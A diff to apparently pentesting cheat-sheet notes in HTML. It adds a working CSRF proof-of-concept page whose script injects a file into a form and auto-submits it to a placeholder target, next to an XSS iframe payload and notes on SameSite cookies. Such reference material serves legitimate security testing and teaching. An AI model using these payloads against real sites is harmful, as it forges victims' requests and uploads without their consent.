@@ -317,6 +317,45 @@ home/000~ROOT~000 # https://github.com/stefanpejcic/wordpress-malware/blob/9b74d
 <span class="s">&lt;/script&gt;"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
 </code></pre></div>
 <h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2>
+<p>CSRF Payload setting up a file into the form to be submitted:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">input</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'input[type="file"]'</span><span class="p">);</span>
+
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">defaultFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">File</span><span class="p">(</span>
+<span class="w">                </span><span class="p">[</span><span class="s2">"&lt;file content&gt;"</span><span class="p">],</span>
+<span class="w">                </span><span class="s2">"&lt;filename&gt;"</span><span class="p">,</span>
+<span class="w">                </span><span class="p">{</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"&lt;mime type&gt;"</span><span class="p">}</span>
+<span class="w">            </span><span class="p">);</span>
+
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">dt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">DataTransfer</span><span class="p">();</span>
+<span class="w">            </span><span class="nx">dt</span><span class="p">.</span><span class="nx">items</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">defaultFile</span><span class="p">);</span>
+
+<span class="w">            </span><span class="nx">input</span><span class="p">.</span><span class="nx">files</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dt</span><span class="p">.</span><span class="nx">files</span><span class="p">;</span>
+
+<span class="w">            </span><span class="kd">const</span><span class="w"> </span><span class="nx">form</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
+<span class="w">            </span><span class="nx">form</span><span class="p">.</span><span class="nx">submit</span><span class="p">()</span>
+
+<span class="w">        </span><span class="p">},</span><span class="w"> </span><span class="mf">500</span><span class="p">)</span>
+
+
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">"multipart/form-data"</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://&lt;target&gt;"</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span>
+        <span class="na">id</span><span class="o">=</span><span class="s">"csrf"</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>CSRF<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"file"</span> <span class="na">name</span><span class="o">=</span><span class="s">"&lt;fieldname&gt;"</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
 <h3 id="samesite-cookies">SameSite Cookies</h3>
 <p>Some applications do not validate that the token belongs to the same session as the user who is making the request.</p>
 <p>In the context of the SameSite, when determining whether a request is same-site or not, the <strong>site</strong> is considered as the <code>scheme</code> plus the <code>TLD + 1</code>.</p>
